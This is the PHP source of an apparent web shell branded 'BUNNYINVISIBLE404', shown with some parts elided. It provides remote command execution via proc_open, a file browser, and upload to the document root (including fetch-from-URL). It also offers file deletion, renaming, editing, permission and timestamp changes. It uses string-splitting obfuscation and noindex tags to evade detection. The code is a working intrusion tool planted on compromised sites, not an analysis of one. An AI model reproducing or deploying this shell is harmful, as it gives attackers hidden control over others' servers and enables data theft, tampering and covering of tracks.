<!DOCTYPE html>
<html>
<head><?php echo "<title> ..:: ./BUNNYINVISIBLE404 ::.. </title>"; ?><meta name="robots" content="noindex, nofollow" /><meta name="googlebot" content="noindex, nofollow" /><meta name="bingbot" content="noindex, nofollow" /><link rel="icon" href="https://i.ibb.co/YPd7d3D/icons-bunny404.jpg" type="image/x-icon"></head>
...
function komend($kom, $lk) {
	...
	if ($a($b)) { $descriptors = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r") ); $process = proc_open($kom, $descriptors, $pipes, $lk); if (is_resource($process)) { $output = stream_get_contents($pipes[1]); fclose($pipes[1]); $status = proc_get_status($process); proc_close($process); return "<pre>".$c($output)."</pre>"; }else{ return "Er"."ro"."r "."ex"."ec"."ut"."in"."g c"."om"."ma"."nd."; }
    }else{
...
$manganse = $srl('\\','/',$manganse);
$manganses = $exp('/',$manganse);
$mangansenya = @$scd($manganse);

foreach($manganses as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?BunnyGG=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?BunnyGG=';
...
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		if ($_POST['dirnya'] == "2") {
			$manganse = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
		}
		if (empty($_FILES['berkas']['name'])) {
			echo "<font color=orange>Fi"."le not Se"."lected !</font><br><br>";
		}else{
			$data = @$fpt($manganse."/".$_FILES['berkas']['name'], @$fgt($_FILES['berkas']['tm'.'p_na'.'me']));
				if ($fxt($manganse."/".$_FILES['berkas']['name'])) {
					$fl = $manganse."/".$_FILES['berkas']['name'];
					echo "Fi"."le Upl"."oa"."ded ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
					if ($sps($manganse, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
		...
		if (empty($_POST['namalink'])) {
			...
			$manganse = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
				...
				$data = @$fpt($manganse."/".$_POST['namalink'], @$fgt($_POST['darilink']));
				if ($fxt($manganse."/".$_POST['namalink'])) {
					$fl = $manganse."/".$_POST['namalink'];
...
<input type="text" name="darilink" class="up" placeholder="ht'.'tps'.'://'.'bun'.'ny'.'inv'.'isible'.'4'.'0'.'4.'.'f'.'b'.'i'.'.g'.'o'.'v'.'/f'.'i'.'le.'.'t'.'x'.'t">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
...
if (isset($_GET['mangansee'])) {
	echo "<tr><td>Current Fi"."le : ".$_GET['mangansee'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars($fgt($_GET['mangansee']))."</pre>";
	author();
} elseif (isset($_POST['BunnyGG']) && $_POST['pilih'] == "hapus") {
	if ($idi($_POST['BunnyGG']) && $fxt($_POST['BunnyGG'])) {
		xrd($_POST['BunnyGG']);
		if ($fxt($_POST['BunnyGG'])) {
			red("Fai"."led to del"."ete Dir"."ec"."tory !");
		}else{
			green("Del"."ete Dir"."ect"."ory Suc"."cess !");
		}
	} elseif ($ifi($_POST['BunnyGG']) && $fxt($_POST['BunnyGG'])) {
		@$ulk($_POST['BunnyGG']);
		if ($fxt($_POST['BunnyGG'])) {
	...
	if (!isset($_POST['cemod'])) {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['BunnyGG'])."<br>";
		}else{
			echo "<center>D"."ir : ".htmlspecialchars($_POST['BunnyGG'])."<br>";
		}
		echo '<form method="post">
		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['BunnyGG'])), -4).'" />
		<input type="hidden" name="BunnyGG" value="'.$_POST['BunnyGG'].'">
		...
		$cm = @$chm($_POST['BunnyGG'], $ocd($_POST['perm']));
		if ($cm == true) {
...
} elseif (isset($_POST['BunnyGG']) && $_POST['pilih'] == "ubahnama") {
	if (isset($_POST['gantin'])) {
		$namabaru = $_GET['BunnyGG']."/".$_POST['newname'];
		$ceen = "re"."na"."me";
		if (@$ceen($_POST['BunnyGG'], $namabaru) === true) {
			...
			<input type="hidden" name="BunnyGG" value="'.$_POST['newname'].'">
		...
		echo '<form method="post">
		New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($bsn($_POST['BunnyGG'])).'" />
		<input type="hidden" name="BunnyGG" value="'.$_POST['BunnyGG'].'">
		<input type="hidden" name="pilih" value="ubahnama">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
	...
	if (isset($_POST['gasedit'])) {
		$edit = @$fpt($_POST['BunnyGG'], $_POST['src']);
		if ($fgt($_POST['BunnyGG']) == $_POST['src']) {
			green("Ed"."it Fi"."le Suc"."ce"."ss !");
		}else{
			red("Ed"."it Fi"."le Fai"."led !");
		}
	}
	echo "<center>Fi"."le : ".htmlspecialchars($_POST['BunnyGG'])."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars($fgt($_POST['BunnyGG'])).'</textarea><br>
	<input type="hidden" name="BunnyGG" value="'.$_POST['BunnyGG'].'">
...
} elseif (isset($_POST['BunnyGG']) && $_POST['pilih'] == "ubahtanggal") {
	if (isset($_POST['tanggale'])) {
		$stt = "st"."rtot"."ime";
		$tch = "t"."ou"."ch";
		$tanggale = $stt($_POST['tanggal']);
		if (@$tch($_POST['BunnyGG'], $tanggale) === true) {
			green("Change Da"."te Succ"."ess !");
			$det = "da"."te";
			$ftm = "fi"."le"."mti"."me";
			$b = $det("d F Y H:i:s", $ftm($_POST['BunnyGG']));
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['BunnyGG'])."<br>";
			}else{
				echo "<center>D"."ir : ".htmlspecialchars($_POST['BunnyGG'])."<br>";
...
} elseif (isset($_POST['BunnyGG']) && $_POST['pilih'] == "dunlut") {
	$dunlute = $_POST['BunnyGG'];
...
} elseif (isset($_POST['BunnyGG']) && $_POST['pilih'] == "fo"."ld"."er") {
    if ($isw("./") || $ird("./")) { $loke = $_POST['BunnyGG']; if (isset($_POST['buatfolder'])) { $buatf = $mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);
            if ($buatf == true) {
                ...
                echo '<input type="hidden" name="BunnyGG" value="'.$_POST['BunnyGG'].'">
            ...
            echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="BunnyGG" value="'.$_POST['BunnyGG'].'"><input type="hidden" name="pilih" value="folder"></form>';
        }
    }
    ...
    if ($isw("./") || $isr("./")) {
        ...
        if (isset($_POST['buatfi'.'le'])) {
            ...
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
                ...
                echo '<input type="hidden" name="BunnyGG" value="'.$_POST['lok'.'nya'].'">
            ...
            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="BunnyGG" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
        }
    }
}
...
echo "<tr>";
$anumase = $srl($bsn($manganse), "", $manganse);
$anumase = $srl("//", "/", $anumase);
echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?BunnyGG=".$anumase."\">..</a></td>
<td><center>--</center></td>
<td><center>".fdt($anumase)."</center></td>
<td><center>".gor($anumase)." / ".ggr($anumase)."</center></td>
<td><center>";
if($isw($anumase)) echo '<font color="green">';
elseif(!$isr($anumase)) echo '<font color="red">';
echo statusnya($anumase);
if($isw($anumase) || !$isr($anumase)) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?pilihan&BunnyGG=$manganse\">
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$Bunnyboy\">
<input type=\"hidden\" name=\"BunnyGG\" value=\"$manganse/$Bunnyboy\">
...
foreach($mangansenya as $Bunnyboy){
	$euybre = $manganse."/".$Bunnyboy;
	$euybre = $srl("//", "/", $euybre);
	if(!$idi($euybre) || $Bunnyboy == '.' || $Bunnyboy == '..') continue;
	echo "<tr>";
	echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?BunnyGG=".$euybre."\">".$Bunnyboy."</a></td>
	<td><center>--</center></td>
...
$skd = "10"."24";
foreach($mangansenya as $Bunnyman) {
	$euybray = $manganse."/".$Bunnyman;
	if(!$ifi("$manganse/$Bunnyman")) continue;
	$size = $fsz("$manganse/$Bunnyman")/$skd;
	$size = $rd($size,3);
	if($size >= $skd){
...
echo "<tr>
<td>".cfn($euybray)." <a href=\"?mangansee=$manganse/$Bunnyman&BunnyGG=$manganse\">$Bunnyman</a></td>
<td><center>".$size."</center></td>
<td><center>".fdt($euybray)."</center></td>
<td><center>".gor($euybray)." / ".ggr($euybray)."</center></td>
<td><center>";
if($isw("$manganse/$Bunnyman")) echo '<font color="green">';
elseif(!$isr("$manganse/$Bunnyman")) echo '<font color="red">';
echo statusnya("$manganse/$Bunnyman");
if($isw("$manganse/$Bunnyman") || !$isr("$manganse/$Bunnyman")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&BunnyGG=$manganse\">
...
<input type=\"hidden\" name=\"BunnyGG\" value=\"$manganse/$Bunnyman\">
</form></center></td>
</tr>";
}
